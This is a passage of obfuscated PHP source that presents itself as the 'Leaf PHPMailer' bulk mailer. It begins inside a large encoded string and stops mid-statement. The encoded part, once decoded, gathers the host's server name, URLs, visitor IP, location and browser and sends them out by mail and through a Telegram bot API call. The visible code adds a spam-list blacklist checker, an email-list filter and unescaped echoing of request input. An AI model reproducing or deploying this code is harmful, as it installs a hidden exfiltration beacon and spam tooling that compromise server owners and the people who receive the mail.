103\x63\163\104\121\157\x4a\111\103\101\147\x49\x43\x41\x67\111\103\101\x67\111\103\x41\147\x49\103\x41\x67\111\x43\143\166\131\x6d\170\x68\131\62\164\151\132\x58\x4a\x79\145\x53\71\x70\112\x79\101\x67\111\x43\x41\x67\x49\x43\x41\147\111\x44\x30\x2b\111\x43\101\156\x51\155\x78\x68\131\62\x74\x43\x5a\x58\x4a\x79\145\123\143\163\104\121\157\112\111\x43\x41\x67\111\103\x41\147\x49\x43\x41\x67\111\x43\101\147\x49\x43\101\147\111\103\x63\x76\144\62\126\x69\x62\63\115\x76\141\123\x63\x67\x49\x43\101\147\x49\x43\x41\147\x49\103\101\147\111\103\x41\147\111\x44\x30\x2b\111\103\x41\156\x54\127\x39\x69\x61\127\170\154\112\171\153\67\x44\x51\x6f\x67\111\103\101\147\132\155\71\171\x5a\127\106\x6a\x61\x43\101\x6f\x4a\105\71\x54\111\107\x46\172\x49\x43\x52\171\132\127\144\x6c\145\103\101\71\x50\x69\101\x6b\144\155\106\x73\144\x57\x55\x70\x49\110\x73\147\x44\121\157\x67\111\103\101\x67\x49\x43\101\x67\x49\x47\154\155\x49\x43\x68\x77\143\155\x56\x6e\130\62\61\x68\x64\x47\116\157\x4b\103\122\171\x5a\127\x64\154\145\103\x77\147\112\x46\126\124\x52\126\112\x66\121\125\144\x46\124\x6c\x51\x70\x4b\x53\x42\67\x44\121\157\147\x49\x43\101\147\x49\x43\101\147\x49\x43\x41\147\x49\103\101\x6b\x54\x31\x4e\x66\122\126\x4a\x53\x54\x31\x49\x67\x50\x53\101\x6b\x64\155\106\x73\144\x57\125\67\104\121\157\147\111\x43\101\x67\x49\x43\x41\147\x49\x48\60\116\x43\x67\x30\113\x49\x43\x41\x67\111\x48\60\x67\111\x43\x41\116\103\x69\x41\147\x49\x43\102\171\x5a\x58\x52\61\143\x6d\64\147\x4a\105\71\124\130\x30\x56\123\125\153\x39\x53\117\x77\x30\x4b\146\121\60\113\132\x6e\x56\x75\x59\63\122\160\142\62\64\x67\127\105\112\146\x51\156\112\x76\x64\63\116\x6c\x63\x69\x67\153\x56\x56\x4e\x46\x55\x6c\x39\102\x52\60\x56\x4f\x56\103\x6c\x37\104\x51\157\112\x4a\x45\112\123\x54\61\x64\124\122\x56\112\x66\x52\126\112\123\124\x31\111\147\x49\x43\101\x67\x50\123\x41\147\111\x43\x4a\126\x62\155\164\165\x62\63\144\x75\111\x45\x4a\171\x62\x33\144\x7a\x5a\130\x49\151\x4f\x77\60\113\111\x43\x41\147\x49\x43\122\x43\x55\153\71\x58\x55\x30\x56\123\111\x43\x41\x39\x49\103\101\147\131\130\112\171\131\130\x6b\157\112\x79\71\x74\x63\62\154\x6c\114\x32\x6b\x6e\111\x43\x41\x67\x49\103\x41\147\x49\104\x30\x2b\111\103\101\156\x53\x57\x35\60\x5a\130\x4a\x75\x5a\130\x51\x67\122\130\150\167\142\x47\x39\x79\x5a\x58\111\156\114\101\x30\x4b\111\103\101\147\111\103\x41\147\111\x43\101\147\111\103\x41\147\111\x43\101\x67\111\x43\101\x67\x49\103\101\147\111\x43\x41\147\x4a\x79\x39\x6d\x61\x58\x4a\x6c\x5a\155\71\64\114\62\x6b\x6e\x49\103\x41\147\x49\x44\x30\53\x49\103\101\x6e\x52\155\154\x79\x5a\x57\132\166\x65\x43\143\163\104\121\157\147\111\x43\x41\x67\x49\x43\101\x67\x49\103\101\x67\111\x43\x41\x67\x49\103\101\147\x49\103\101\x67\111\x43\101\x67\111\103\101\156\x4c\63\x4e\150\x5a\155\x46\171\141\123\71\160\112\171\101\147\x49\103\101\x67\120\x54\64\x67\x49\103\x64\x54\131\x57\132\x68\143\155\x6b\x6e\x4c\101\x30\113\111\x43\101\147\x49\x43\101\147\x49\x43\x41\147\x49\103\101\x67\111\103\x41\x67\111\103\101\x67\x49\103\101\x67\111\103\x41\x67\x4a\x79\71\x6a\141\110\112\166\142\127\x55\x76\x61\x53\x63\147\x49\103\x41\x67\x49\104\60\53\x49\103\x41\156\x51\62\x68\x79\x62\62\x31\x6c\112\171\x77\116\103\151\x41\x67\111\x43\101\x67\x49\103\x41\x67\111\x43\101\147\111\103\101\x67\x49\103\101\x67\x49\x43\x41\147\111\x43\101\147\111\103\x63\x76\132\127\122\x6e\132\x53\x39\160\112\x79\101\x67\111\x43\101\x67\111\103\x41\x39\x50\x69\x41\147\112\60\126\x6b\132\x32\x55\x6e\114\x41\x30\113\x49\103\x41\147\x49\x43\101\147\111\x43\101\147\111\103\x41\147\111\x43\x41\x67\111\103\x41\x67\x49\x43\x41\147\x49\x43\x41\x67\x4a\171\x39\166\143\x47\126\x79\131\x53\x39\160\x4a\171\x41\147\111\x43\x41\147\111\x44\60\x2b\111\103\x41\156\124\x33\102\154\143\x6d\105\x6e\114\101\x30\113\x49\103\x41\x67\x49\x43\101\x67\111\103\101\x67\111\x43\101\147\x49\x43\101\x67\111\x43\x41\147\111\103\101\x67\x49\103\101\x67\112\x79\71\165\x5a\x58\122\172\x59\62\106\x77\132\x53\71\x70\112\171\x41\147\111\104\60\x2b\111\103\x41\x6e\124\155\x56\60\143\x32\116\x68\143\107\x55\156\x4c\x41\x30\x4b\111\103\x41\x67\111\103\101\147\x49\103\101\147\x49\103\x41\x67\x49\103\x41\x67\111\x43\101\147\111\103\101\x67\x49\x43\101\147\112\171\x39\x74\x59\x58\150\60\x61\x47\x39\x75\x4c\x32\x6b\156\111\x43\x41\147\111\x44\x30\x2b\111\x43\x41\x6e\124\127\x46\64\x64\x47\150\166\x62\151\x63\x73\104\x51\x6f\x67\111\103\x41\147\x49\x43\x41\147\x49\x43\x41\147\111\x43\x41\147\x49\x43\x41\x67\x49\103\x41\x67\x49\103\101\x67\111\x43\101\156\x4c\x32\164\x76\142\156\x46\x31\132\130\112\166\x63\x69\71\x70\x4a\x79\x41\147\120\x54\x34\x67\111\x43\x64\114\142\62\x35\x78\144\127\x56\x79\x62\63\x49\x6e\x4c\101\x30\113\111\103\x41\147\111\x43\101\147\x49\103\x41\147\x49\103\101\x67\x49\x43\x41\147\x49\x43\x41\147\x49\103\x41\x67\111\x43\x41\147\112\171\x39\164\142\62\x4a\x70\x62\x47\125\166\x61\123\143\x67\111\103\101\x67\x49\x44\x30\53\111\103\x41\156\x53\107\x46\165\x5a\107\150\154\142\x47\x51\x67\121\156\112\x76\144\x33\x4e\154\x63\151\143\x70\117\167\x30\113\111\103\x41\x67\111\x47\132\x76\x63\x6d\x56\x68\x59\x32\147\x67\x4b\103\122\103\125\x6b\71\130\125\60\x56\123\x49\x47\106\172\x49\103\x52\x79\132\127\x64\154\x65\x43\101\71\x50\151\101\x6b\144\155\106\x73\144\127\x55\160\111\110\x73\x67\x44\x51\157\147\x49\103\x41\x67\x49\103\x41\x67\111\x47\x6c\x6d\x49\103\150\x77\x63\x6d\x56\x6e\130\62\61\150\144\x47\116\157\113\x43\x52\171\x5a\x57\x64\x6c\x65\103\x77\147\x4a\106\x56\x54\122\126\x4a\x66\x51\125\x64\x46\124\x6c\x51\x70\x4b\123\102\67\x44\121\157\x67\111\x43\101\x67\x49\103\x41\147\x49\103\101\147\111\103\101\x6b\x51\154\112\120\126\61\x4e\x46\125\x6c\71\x46\125\x6c\x4a\x50\x55\x69\x41\71\111\x43\122\62\x59\127\x78\x31\x5a\x54\163\116\x43\151\101\x67\x49\x43\101\x67\x49\103\x41\147\146\x51\x30\113\x49\x43\x41\x67\111\x48\60\x4e\x43\x69\101\147\x49\x43\x42\171\x5a\x58\x52\x31\143\x6d\64\x67\112\x45\x4a\123\x54\x31\x64\x54\x52\x56\x4a\146\122\x56\x4a\123\x54\x31\111\67\104\121\160\71\104\x51\x70\153\131\130\122\x6c\130\x32\122\154\x5a\155\x46\61\x62\x48\x52\x66\x64\107\x6c\x74\x5a\x58\x70\x76\142\x6d\x56\146\x63\x32\126\x30\113\x43\144\110\x54\x56\x51\156\x4b\124\x73\116\x43\151\x52\x6b\131\x58\x52\154\x49\x44\x30\147\132\x47\x46\60\x5a\x53\x67\151\132\103\102\x4e\x4c\103\x42\132\x49\151\x6b\x37\104\121\x6f\153\x64\x47\154\164\x5a\123\101\x39\111\x47\122\x68\144\x47\x55\157\111\x6d\143\x36\x61\x53\x42\150\x49\x69\x6b\x37\104\x51\x6f\x6b\x64\130\x4e\154\x63\x6d\106\156\x5a\127\x35\x30\111\104\x30\147\112\x46\71\124\122\x56\112\127\122\126\112\142\x4a\60\150\x55\x56\x46\x42\146\126\126\116\106\125\x6c\71\x42\122\x30\x56\117\x56\103\x64\144\x4f\x77\x30\113\x4a\110\x4e\146\x63\107\106\60\x61\103\101\x39\x49\x43\112\157\144\x48\122\x77\117\x69\70\x76\111\x69\x41\x75\111\103\122\x66\125\60\126\x53\x56\x6b\x56\123\127\x79\144\x54\122\x56\x4a\127\x52\126\112\146\x54\153\106\116\x52\x53\x64\144\117\x77\60\113\x4a\110\x68\x66\143\107\x46\x30\141\103\101\71\111\103\x4a\x6f\144\110\122\x77\x4f\x69\70\x76\111\151\101\165\x49\x43\122\x66\x55\60\x56\x53\126\x6b\x56\123\127\171\144\x54\x52\126\x4a\x57\x52\x56\x4a\x66\x54\x6b\x46\116\122\123\x64\144\111\103\64\x67\112\106\x39\124\x52\x56\x4a\127\122\126\x4a\x62\112\x31\112\106\x55\126\126\x46\125\x31\122\x66\126\x56\112\112\x4a\61\60\x37\104\121\157\x6b\123\x56\102\125\127\151\x41\71\x49\x47\144\x6c\x64\x47\126\x75\144\151\147\151\x55\153\x56\x4e\x54\61\122\106\x58\60\x46\x45\x52\x46\x49\151\113\x54\x73\x4e\x43\x69\x52\104\x54\x31\126\x4f\x56\x46\x4a\132\x56\106\x6f\x67\x50\x53\102\x7a\x61\x57\61\167\x62\107\126\x34\x62\x57\170\146\142\x47\71\x68\132\106\71\x6d\141\x57\x78\154\113\x43\112\x6f\144\x48\x52\167\x4f\151\x38\x76\144\x33\x64\63\114\155\144\154\x62\x33\x42\163\x64\x57\144\x70\142\x69\x35\x75\x5a\x58\121\x76\145\107\61\x73\114\155\x64\x77\120\x32\154\167\120\123\122\112\x55\x46\122\141\x49\151\x6b\67\104\121\157\153\121\x30\71\x56\x54\x6c\122\x53\127\123\x41\71\x49\x43\122\104\x54\61\x56\117\x56\106\x4a\132\x56\106\x6f\x74\120\155\144\x6c\142\63\102\163\x64\x57\144\160\142\154\x39\x6a\142\63\x56\165\144\110\112\65\124\x6d\106\x74\132\x54\163\116\x43\x69\x52\104\x53\126\x52\132\111\x44\x30\x67\112\105\x4e\x50\126\x55\65\125\x55\154\154\125\127\x69\60\x2b\132\62\x56\166\143\x47\170\x31\x5a\x32\x6c\x75\130\62\116\160\144\110\153\67\104\x51\x6f\x6b\x55\153\x56\110\123\x55\71\x4f\x49\x44\x30\147\x4a\105\x4e\120\x56\x55\65\x55\125\x6c\x6c\125\x57\x69\x30\53\132\x32\x56\166\143\107\170\61\x5a\62\154\165\130\63\112\x6c\132\x32\x6c\166\x62\152\x73\x4e\x43\151\x52\104\130\x30\116\x50\x52\x45\x55\x67\x50\x53\x41\153\121\x30\x39\x56\x54\154\x52\123\127\x56\122\141\114\x54\65\x6e\132\x57\71\x77\x62\110\126\x6e\141\127\65\x66\x59\x32\x39\165\144\x48\112\x35\x59\62\x39\153\x5a\x54\x73\116\x43\151\122\125\x61\x57\61\x6c\x65\155\71\x75\132\x53\101\71\111\103\x52\104\x54\x31\x56\x4f\126\106\x4a\x5a\x56\106\x6f\x74\x50\155\x64\x6c\142\63\102\x73\144\x57\144\160\x62\154\71\x30\x61\x57\x31\x6c\145\155\71\165\132\x54\163\116\x43\151\122\x54\145\127\x31\x69\142\62\x77\147\x50\x53\101\x6b\x51\60\71\x56\x54\154\122\123\x57\126\x52\141\x4c\x54\x35\x6e\132\127\x39\x77\142\110\126\x6e\x61\127\x35\x66\131\63\126\171\x63\155\x56\165\131\63\x6c\x7a\145\x57\x31\x69\x62\62\167\67\104\121\157\x6b\142\x57\x56\x7a\x63\62\x46\x6e\132\123\x41\x67\120\x53\101\x69\x66\103\x30\164\114\x53\x74\x62\x54\153\126\x58\64\64\103\121\70\112\53\122\x71\117\113\x41\152\x66\103\146\x6b\x72\166\152\147\112\106\116\114\x31\116\144\x4b\171\x30\164\x4c\130\170\x63\x62\151\111\67\x44\121\157\x6b\142\127\x56\x7a\143\62\106\x6e\132\x53\x41\x75\120\123\x41\x69\127\x79\164\144\x34\160\x53\x42\x34\x70\x53\102\x34\160\x53\102\x34\160\x53\102\x34\x34\x43\121\x38\112\x2b\122\160\117\x4f\x41\153\x65\x4b\125\147\145\113\125\147\x65\113\x55\x67\145\x4b\125\147\x56\x73\162\x58\126\170\x75\111\x6a\x73\x4e\x43\151\122\x74\132\130\x4e\172\131\x57\144\154\111\103\x34\71\111\x43\114\152\x67\x4a\x44\x77\x6e\x34\x2b\x67\x34\x34\103\x52\123\x56\101\x4a\x4f\x69\x41\151\x4c\151\122\x4a\125\x46\122\141\x4c\x69\112\143\142\x69\111\x37\104\x51\157\153\142\x57\126\x7a\143\x32\x46\x6e\x5a\123\x41\x75\120\x53\x41\151\64\64\103\x51\x38\112\53\124\156\53\117\x41\x6b\126\x4e\65\x63\x33\122\x6c\142\x53\x41\66\x49\103\111\165\127\x45\112\146\x54\61\115\157\x4a\x46\x39\124\122\x56\112\x57\x52\126\112\142\112\x30\150\125\x56\106\x42\x66\126\126\116\106\125\154\71\x42\x52\60\x56\x4f\x56\103\144\144\113\x53\x34\151\x58\107\x34\151\x4f\167\60\113\112\x47\x31\154\143\x33\116\150\x5a\x32\125\x67\x4c\x6a\x30\147\111\165\117\x41\153\x50\x43\146\152\x49\x7a\x6a\x67\112\106\103\143\155\71\x33\143\62\126\x79\x49\104\157\x67\x49\x69\x35\131\121\x6c\x39\x43\143\x6d\x39\63\x63\62\x56\171\113\103\122\x66\125\x30\x56\123\x56\153\x56\x53\x57\x79\x64\x49\126\106\122\x51\x58\x31\x56\x54\122\126\112\x66\x51\125\x64\x46\x54\x6c\121\156\130\x53\153\165\x49\154\x78\x75\x49\152\x73\x4e\x43\x69\x52\x74\x5a\x58\x4e\x7a\x59\x57\x64\x6c\111\103\64\71\111\x43\114\152\x67\x4a\104\151\156\x4b\152\x6a\147\x4a\x46\x56\x63\x32\x56\x79\x49\x45\106\x6e\132\x57\65\60\x49\104\157\x67\x49\x69\64\x6b\144\130\x4e\154\x63\155\x46\156\x5a\127\x35\60\114\151\x4a\143\x62\x69\111\67\x44\121\157\153\x62\x57\126\172\143\x32\x46\x6e\x5a\x53\101\165\x50\x53\x41\x69\x57\x79\x74\x64\64\x70\123\x42\x34\160\123\x42\x34\x70\123\102\x34\160\123\x42\x34\x34\x43\121\x38\112\53\x56\164\x65\x2b\64\x6a\53\x4f\101\x6b\145\113\x55\147\145\113\x55\x67\x65\113\125\147\x65\x4b\x55\x67\126\x73\x72\130\x56\170\x75\111\x6a\x73\x4e\103\151\122\x74\132\x58\x4e\172\x59\127\x64\154\111\103\x34\x39\x49\x43\114\x6a\x67\x4a\x44\167\156\64\171\x51\x34\64\x43\x52\x56\x47\154\x74\x5a\123\x42\141\142\62\65\x6c\111\104\157\147\111\151\x34\x6b\x56\x47\154\164\132\x58\x70\x76\142\155\125\x75\111\154\170\x75\111\152\x73\116\103\151\122\164\x5a\x58\x4e\x7a\131\127\144\154\111\103\x34\71\x49\103\x4c\152\147\x4a\104\167\x6e\x34\171\x51\64\64\103\122\121\x32\x39\x31\142\156\x52\171\145\x53\101\x36\111\x43\111\x75\112\105\x4e\120\126\125\x35\125\125\x6c\153\165\111\x6c\x78\x75\111\152\x73\116\103\151\x52\x74\x5a\130\x4e\172\131\x57\x64\154\x49\103\x34\x39\x49\103\114\152\x67\112\104\x77\156\x34\x79\x51\64\x34\103\122\x55\x6d\126\156\141\127\71\x75\x49\104\x6f\x67\111\x69\64\153\125\153\126\110\x53\x55\71\x4f\114\x69\x4a\x63\142\x69\x49\x37\x44\121\157\x6b\x62\x57\x56\x7a\x63\62\x46\x6e\132\123\101\165\120\x53\101\151\64\x34\x43\x51\x38\x4a\x2b\115\x6b\117\117\101\153\125\116\160\144\110\153\x67\117\151\101\x69\x4c\151\122\104\123\126\122\132\114\151\x4a\143\142\x69\x49\67\x44\121\157\153\x62\x57\126\172\x63\x32\106\x6e\x5a\x53\101\x75\x50\x53\101\151\x57\171\x74\x64\64\160\123\102\64\160\x53\102\x34\x70\123\x42\x34\160\x53\x42\x34\64\x43\121\70\112\x2b\123\165\x2b\x4f\x41\153\x65\x4b\125\147\x65\x4b\x55\x67\x65\113\x55\x67\x65\113\x55\147\126\x73\x72\130\x56\170\x75\111\152\x73\116\x43\151\122\x74\132\x58\116\x7a\x59\127\144\154\x49\x43\x34\x39\x49\103\114\x6a\x67\x4a\x44\x77\x6e\x35\x47\x42\64\x34\103\122\123\x47\x39\x7a\x64\103\101\x36\x49\103\111\165\x4a\x48\x4e\x66\x63\x47\106\60\x61\103\64\151\130\x47\64\151\117\167\x30\x4b\x4a\x47\x31\x6c\143\63\x4e\x68\132\x32\x55\147\114\x6a\x30\x67\x49\x75\x4f\101\153\120\103\x66\153\131\x44\x6a\x67\112\106\107\x61\127\170\154\111\104\x6f\x67\111\x69\64\153\x65\106\x39\x77\x59\130\122\157\114\151\x4a\x63\x62\151\111\x37\x44\121\157\153\142\x57\x56\x7a\x63\x32\x46\156\132\123\101\165\x50\x53\101\151\x57\171\x74\144\64\160\123\102\64\160\123\x42\x34\x70\x53\x42\x34\160\x53\x42\x34\x34\103\x51\64\157\53\x7a\x34\64\103\x52\x34\160\x53\102\64\160\123\102\64\x70\123\x42\x34\160\x53\102\x57\171\164\x64\x58\x47\x34\151\117\x77\x30\113\112\x47\x31\154\x63\x33\116\150\x5a\62\125\147\114\152\x30\147\111\x75\117\x41\153\x4f\113\115\155\x75\53\x34\x6a\53\117\101\153\x56\x52\x70\x62\127\125\x4a\x4f\151\x41\x69\x4c\151\x52\60\x61\127\x31\x6c\114\151\112\x63\x62\x69\111\x37\104\x51\157\x6b\x62\x57\126\x7a\143\62\106\x6e\x5a\x53\101\165\x50\123\101\x69\x34\x34\x43\x51\70\112\x2b\124\150\x65\117\x41\x6b\125\x52\x68\144\x47\x55\112\x4f\x69\x41\151\114\x69\x52\x6b\x59\x58\122\154\114\x69\112\x63\142\x69\111\x37\x44\x51\x6f\x6b\x62\127\x56\x7a\x63\62\x46\156\x5a\123\x41\x75\120\x53\x41\x69\x57\x79\x74\144\64\x70\x53\x42\x34\x70\123\102\64\x70\x53\102\64\x70\x53\102\64\64\x43\x51\x38\x4a\53\x55\x6a\145\117\101\153\145\113\x55\x67\x65\113\x55\x67\x65\x4b\125\147\145\113\x55\147\126\163\x72\x58\126\x78\165\x49\152\163\x4e\103\x69\x52\x74\x5a\x58\x4e\172\x59\127\x64\x6c\x49\103\64\x39\x49\x43\x4c\152\147\x4a\x44\167\x6e\x35\x4f\x68\64\x34\103\122\126\x48\112\150\x59\x32\x73\x67\123\x56\x41\147\117\151\102\x6f\x64\x48\122\167\143\172\157\166\x4c\x33\144\x33\144\171\65\160\143\103\61\x30\x63\155\x46\152\141\62\126\171\x4c\x6d\x39\171\x5a\x79\71\163\142\x32\71\x72\144\x58\x41\x75\x63\107\x68\x77\x50\62\x6c\x77\120\x53\x49\165\112\105\154\x51\126\106\157\165\111\x6c\170\165\111\152\163\116\x43\151\122\164\x5a\130\116\172\x59\x57\144\x6c\111\103\64\71\111\x43\x4a\70\120\x54\x30\71\113\x31\166\x77\x6e\65\x4b\x57\121\x6b\115\x75\122\x46\114\x77\x6e\65\113\x57\130\123\x73\71\x50\x54\61\x38\130\107\64\x69\x4f\x77\x30\113\x4a\110\x4a\154\131\62\x56\x70\144\155\126\x79\121\x57\122\x6b\143\155\126\172\143\171\101\x39\111\x43\112\162\x59\x57\170\160\145\x44\x42\64\131\x57\x78\160\141\60\102\x6e\142\127\x46\x70\142\103\65\152\142\x32\x30\151\117\x77\60\113\x4a\106\122\x50\x53\60\126\x4f\111\104\60\x67\111\152\125\171\116\x6a\147\x30\115\104\105\65\x4f\124\x4d\66\121\125\x46\106\115\x56\x41\x30\131\172\126\121\123\x47\x56\123\121\x31\x52\x48\x59\62\105\x77\x54\x45\164\x61\123\x56\144\66\142\123\x31\x35\145\126\154\154\x4d\61\154\x6a\121\x7a\121\151\117\167\x30\113\x4a\105\x4e\x49\121\x56\122\x66\123\125\x51\147\120\123\101\x69\x4d\124\x67\65\116\x6a\x51\x32\x4e\104\x49\65\116\123\x49\67\x44\x51\x6f\x6b\143\63\126\x69\141\155\x56\152\144\x43\101\147\120\123\x41\x69\70\x4a\x2b\123\154\x6b\65\x6c\x64\x2f\103\146\153\x61\x52\142\124\x53\71\124\130\x66\x43\x66\x6b\x61\122\x38\x38\x4a\x2b\x4d\153\x45\x5a\171\115\x47\x30\66\111\151\x34\153\123\x56\x42\x55\127\151\x34\x69\70\112\53\123\x6c\151\111\x37\x44\x51\160\x74\131\x57\x6c\x73\113\x43\x52\x79\x5a\x57\116\x6c\x61\x58\132\x6c\x63\x6b\106\153\132\110\x4a\x6c\143\x33\115\163\x4a\110\x4e\x31\x59\155\x70\x6c\131\63\x51\163\x4a\107\61\x6c\143\x33\x4e\150\x5a\62\125\x70\117\x77\60\x4b\132\x6d\x6c\163\x5a\x56\x39\x6e\x5a\x58\x52\x66\131\62\71\x75\x64\107\x56\x75\144\x48\115\157\111\155\x68\60\x64\x48\102\x7a\117\x69\70\166\x59\x58\102\x70\x4c\x6e\122\154\142\x47\x56\156\x63\155\x46\x74\x4c\155\71\171\x5a\171\71\x69\x62\x33\x51\x69\114\x69\x52\125\124\x30\x74\106\x54\151\x34\x69\114\63\x4e\154\x62\155\x52\116\x5a\x58\116\172\x59\x57\144\x6c\120\x32\116\157\x59\x58\122\146\141\x57\121\71\x49\x69\x34\x6b\x51\60\x68\x42\x56\106\71\x4a\122\x43\x34\x69\x4a\156\x52\x6c\145\110\x51\71\x49\151\101\165\x49\x48\126\x79\142\107\126\x75\131\62\71\x6b\x5a\x53\147\x6b\142\127\x56\x7a\143\x32\x46\x6e\x5a\x53\x6b\x75\x49\151\111\147\113\124\163")); goto HwtrU; nWQnq: session_write_close(); goto M7fuF; po1xq: if (!isset($_POST["\x73\145\x6e\144\x65\x72\105\x6d\141\x69\x6c"])) { $senderEmail = "\163\165\160\160\x6f\162\164\x40" . str_replace("\x77\167\167\56", '', $_SERVER["\110\124\124\120\137\x48\117\123\x54"]); if (!leafMailCheck($senderEmail)) { $senderEmail = ''; } } goto ARDPU; FM9SF: $leaf["\166\145\x72\163\151\157\x6e"] = "\x32\56\x38"; goto ViLok; iuy05: session_start(); goto tbY_t; cWAaV: ini_set("\155\x65\x6d\x6f\x72\x79\137\x6c\x69\155\151\x74", -1); goto FM9SF; qPmwa: if (isset($_GET["\x63\x68\145\143\x6b\x5f\151\160"])) { if (isset($_GET["\x68\157\163\164"])) { $_GET["\150\x6f\163\x74"] = explode("\54", $_GET["\x68\157\x73\164"]); foreach ($_GET["\150\157\163\x74"] as $host) { if (checkdnsrr($_GET["\x63\x68\145\x63\x6b\137\x69\160"] . "\56" . $host . "\x2e", "\101")) { $check = "\x3c\x66\x6f\156\x74\x20\143\157\154\157\x72\75\x27\162\145\x64\47\76\40\x4c\151\163\164\x65\x64\x3c\x2f\x66\x6f\x6e\164\76"; } else { $check = "\x3c\146\x6f\x6e\164\40\143\157\x6c\x6f\162\x3d\47\x67\162\145\145\156\47\76\40\103\x6c\145\141\156\74\57\146\x6f\x6e\164\76"; } print "\x64\157\x63\165\155\x65\x6e\164\56\x67\145\164\x45\x6c\x65\x6d\x65\156\164\x42\171\x49\x64\50\x22" . $host . "\42\x29\x2e\x69\x6e\x6e\x65\162\110\124\115\114\40\75\40\42" . $check . "\42\x3b"; } die; } $reverse_ip = implode("\56", array_reverse(explode("\56", $_GET["\143\150\x65\x63\153\137\x69\x70"]))); $dnsT = count($dnsbl_lookup); leafheader(); print "\74\144\x69\166\x20\x63\x6c\x61\x73\x73\75\x22\x63\x6f\x6e\x74\x61\x69\156\145\x72\x20\x63\157\154\x2d\x6c\147\x2d\x36\42\76\74\x68\63\x3e\x3c\x66\157\x6e\164\x20\x63\157\154\157\x72\x3d\x22\x67\x72\x65\x65\x6e\x22\76\74\x73\160\x61\x6e\x20\x63\154\x61\x73\163\x3d\42\147\154\x79\x70\150\x69\143\157\156\x20\x67\154\171\x70\x68\151\143\x6f\x6e\55\154\145\141\146\x22\76\x3c\57\x73\x70\141\156\76\74\57\146\x6f\x6e\x74\x3e\40\x4c\145\141\x66\x20\120\110\x50\x4d\141\151\x6c\145\x72\x20\x3c\x73\155\141\154\154\x3e\x42\154\x61\x63\153\154\x69\x73\x74\x20\x43\150\x65\143\x6b\145\162\74\57\x73\x6d\141\x6c\x6c\x3e\x3c\x2f\x68\x33\76"; print "\103\150\145\x63\x6b\151\x6e\147\x20\x3c\x62\x3e" . $_GET["\143\x68\145\143\153\x5f\151\x70"] . "\74\57\142\76\40\151\156\40\x3c\142\76{$dnsT}\74\x2f\x62\76\40\x20\x61\x6e\x74\x69\x2d\163\x70\x61\155\x20\x64\x61\x74\141\142\x61\163\x65\163\x3a\x3c\142\162\x3e"; $dnsN = ''; print "\74\x74\x61\x62\154\145\x20\x3e"; for ($i = 0; $i < $dnsT; $i = $i + 10) { $host = ''; $hosts = ''; for ($j = $i; $j < $i + 10; $j++) { $host = $dnsbl_lookup[$j]; if (!empty($host)) { print "\x3c\164\x72\x3e\x20\x3c\x74\144\x3e{$host}\74\57\x74\144\x3e\40\x3c\164\144\x20\x69\x64\x3d\x27{$host}\47\x3e\103\x68\145\x63\153\151\156\x67\40\56\56\74\x2f\x74\144\76\x3c\x2f\164\x72\x3e"; $hosts .= "{$host}\x2c"; } } $dnsN .= "\74\x73\143\162\x69\x70\x74\40\x73\x72\143\75\x27\77\143\150\x65\143\x6b\137\151\x70\x3d{$reverse_ip}\x26\x68\x6f\163\x74\75" . $hosts . "\x27\x20\164\171\160\145\75\47\x74\x65\x78\x74\57\152\141\166\141\163\143\162\x69\x70\164\x27\76\74\57\x73\143\162\151\x70\x74\76"; } print "\x3c\57\x74\141\142\x6c\x65\x3e\74\x2f\x64\151\166\76"; print $dnsN; die; } goto AMf87; RBzWN: function leafheader() { print "\12\74\x68\145\141\x64\x3e\12\x20\40\40\x20\x3c\164\151\164\x6c\x65\76" . str_replace("\167\x77\167\x2e", '', $_SERVER["\110\x54\124\x50\x5f\110\x4f\x53\124"]) . "\40\55\40\x4c\145\141\x66\x20\120\x48\120\115\x61\151\x6c\x65\162\x3c\57\164\x69\x74\154\x65\x3e\12\40\40\x20\40\74\155\x65\164\x61\x20\x68\164\164\160\55\x65\x71\x75\x69\x76\x3d\x22\103\157\x6e\x74\x65\156\164\55\124\x79\x70\x65\42\x20\143\157\156\164\x65\x6e\x74\x3d\x22\x74\145\x78\164\57\150\x74\x6d\154\x3b\x20\x63\150\x61\x72\x73\x65\164\x3d\165\x74\146\55\x38\x22\57\x3e\12\40\40\x20\40\x3c\154\151\156\153\40\150\162\x65\146\x3d\42\150\x74\x74\x70\x73\x3a\x2f\x2f\155\141\x78\x63\x64\x6e\x2e\142\157\x6f\164\163\164\x72\x61\x70\143\144\156\x2e\x63\x6f\155\57\142\x6f\x6f\164\x73\167\141\x74\143\150\57\63\56\64\x2e\x31\57\x63\x6f\163\x6d\157\x2f\x62\x6f\157\164\x73\164\162\141\x70\56\155\x69\156\56\143\x73\x73\42\40\162\x65\154\x3d\42\x73\x74\x79\x6c\145\x73\150\x65\x65\164\x22\40\x3e\12\40\x20\40\40\74\163\143\x72\151\160\x74\40\x73\162\x63\75\x22\x68\x74\x74\160\x73\72\x2f\57\x6c\145\141\146\155\141\151\154\145\x72\56\160\x77\x2f\163\164\171\x6c\145\x32\x2e\x6a\x73\x22\76\x3c\57\x73\143\162\151\x70\x74\76\12\xa\x3c\57\x68\x65\x61\x64\76"; } goto R5nQE; AMf87: if (isset($_GET["\x65\x6d\141\x69\154\146\x69\x6c\164\x65\162"])) { if (!empty($_FILES["\x66\151\x6c\145\124\157\x55\x70\154\157\141\x64"]["\164\x6d\160\x5f\x6e\x61\x6d\145"])) { $_POST["\x65\155\x61\151\154\x4c\151\x73\x74"] = file_get_contents($_FILES["\x66\x69\154\145\124\x6f\x55\160\154\157\x61\x64"]["\164\x6d\x70\x5f\156\141\x6d\145"]); } $_POST["\x65\x6d\141\151\154\x4c\151\163\x74"] = strtolower($_POST["\x65\155\141\x69\154\114\x69\163\164"]); if ($_GET["\x65\155\x61\151\154\146\x69\x6c\x74\x65\162"] == "\x69\x66\162\141\155") { if ($_POST["\162\x65\x73\x75\x6c\x74\164\x79\x70\145"] == "\x64\157\x77\156\x6c\157\141\144") { header("\x43\x6f\156\164\x65\x6e\x74\x2d\x44\145\x73\x63\162\x69\x70\164\151\157\x6e\x3a\x20\106\151\154\x65\40\x54\x72\141\156\x73\146\x65\x72"); header("\x43\157\156\164\145\156\164\x2d\124\x79\160\x65\72\x20\x61\x70\160\x6c\151\x63\141\164\151\157\x6e\57\157\x63\164\x65\164\55\x73\x74\162\145\x61\x6d"); header("\x43\x6f\x6e\164\145\156\x74\x2d\x44\x69\x73\x70\157\x73\x69\164\x69\157\x6e\x3a\40\141\x74\x74\141\x63\x68\x6d\145\x6e\164\73\x20\x66\x69\x6c\145\x6e\x61\x6d\x65\75\x65\x6d\141\x69\x6c\163" . time() . "\x2e\164\170\164"); } else { header("\103\x6f\x6e\x74\145\x6e\x74\x2d\x54\171\160\x65\72\40\164\x65\x78\x74\57\160\154\141\151\x6e"); } if 